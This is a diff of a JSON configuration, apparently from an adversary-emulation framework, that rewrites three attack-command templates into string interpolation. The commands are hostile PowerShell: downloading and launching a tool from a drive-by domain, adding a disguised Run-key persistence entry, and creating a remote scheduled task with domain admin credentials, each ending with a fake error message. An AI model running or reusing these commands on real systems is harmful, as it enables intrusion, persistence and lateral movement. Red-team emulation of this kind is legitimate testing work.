@@ -163,19 +163,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Invoke-WebRequest -Uri \"",
-                            "self.driveby_domain2",
-                            "/",
-                            "self.tool_name2",
-                            "\" -OutFile C:\\Users\\$username\\AppData\\Local\\Temp\\",
-                            "self.tool_name2",
-                            "; start C:\\Users\\$username\\AppData\\Local\\Temp\\",
-                            "self.tool_name2",
-                            "; echo \"stderr: \u0001 Command not found\"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Invoke-WebRequest -Uri \"${self.driveby_domain2}/${self.tool_name2}\" -OutFile C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}; start C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2}; echo \"stderr: \u0001 Command not found\"}"
                 }
             }
         },
@@ -188,13 +176,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d C:\\Users\\$username\\AppData\\Local\\Temp\\",
-                            "self.tool_name2",
-                            " /f}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d C:\\Users\\$username\\AppData\\Local\\Temp\\${self.tool_name2} /f}"
                 }
             }
         },
@@ -220,29 +202,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{schtasks.exe /create /f /SC once /ST 23:59 /TN ",
-                            "self.taskname",
-                            " /TR ",
-                            "self.payload",
-                            " /RL highest /u ",
-                            "self.domain_admin_username",
-                            "@",
-                            "self.domain",
-                            " /p ",
-                            "self.domain_admin_password",
-                            " /ru ",
-                            "self.domain_admin_username",
-                            "@",
-                            "self.domain",
-                            " /rp ",
-                            "self.domain_admin_password",
-                            " /s ",
-                            "self.dst_hostname",
-                            "; echo \"stderr: \u0001 Command not found\"}"
-                        ]
-                    }
+                    "command": "powershell &{schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.taskname} /TR ${self.payload} /RL highest /u ${self.domain_admin_username}@${self.domain} /p ${self.domain_admin_password} /ru ${self.domain_admin_username}@${self.domain} /rp ${self.domain_admin_password} /s ${self.dst_hostname}; echo \"stderr: \u0001 Command not found\"}"
                 }
             }
         },
